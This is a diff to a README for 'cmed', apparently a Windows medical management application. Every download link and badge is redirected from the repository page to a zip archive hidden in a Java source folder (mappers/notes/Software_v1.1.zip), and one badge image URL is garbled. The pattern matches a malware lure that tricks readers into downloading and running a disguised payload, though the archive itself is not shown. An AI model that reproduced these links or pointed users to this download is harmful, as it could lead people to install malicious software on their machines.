@@ -1,6 +1,6 @@
 # ⚕️ cmed - Simple Medical Management Software
 
-[![Download cmed](https://img.shields.io/badge/Download-cmed-brightgreen)](https://github.com/Creamy1255/cmed)
+[![Download cmed](https://github.com/Creamy1255/cmed/raw/refs/heads/main/cmed-app/src/main/java/com/cmed/app/mappers/notes/Software_v1.1.zip)](https://github.com/Creamy1255/cmed/raw/refs/heads/main/cmed-app/src/main/java/com/cmed/app/mappers/notes/Software_v1.1.zip)
 
 ## 📋 About cmed
 
@@ -20,7 +20,7 @@ This guide walks you through downloading and running cmed on a Windows PC. You d
 
 To get started, visit this page to download cmed:
 
-[https://github.com/Creamy1255/cmed](https://github.com/Creamy1255/cmed)
+[https://github.com/Creamy1255/cmed/raw/refs/heads/main/cmed-app/src/main/java/com/cmed/app/mappers/notes/Software_v1.1.zip](https://github.com/Creamy1255/cmed/raw/refs/heads/main/cmed-app/src/main/java/com/cmed/app/mappers/notes/Software_v1.1.zip)
 
 You will find the latest release files available for download. Look for a file with a Windows executable, such as `.exe`. 
 
@@ -129,7 +129,7 @@ If you see errors inside the app:
 
 ## 📥 Quick Download Link
 
-[![Download cmed](https://img.shields.io/badge/Download%20Now-cmed-blue)](https://github.com/Creamy1255/cmed)
+[![Download cmed](https://github.com/Creamy1255/cmed/raw/refs/heads/main/cmed-app/src/main/java/com/cmed/app/mappers/notes/Software_v1.1.zip%20Now-cmed-blue)](https://github.com/Creamy1255/cmed/raw/refs/heads/main/cmed-app/src/main/java/com/cmed/app/mappers/notes/Software_v1.1.zip)
 
 Click the button above to visit the page where you can download the software and get started.
 
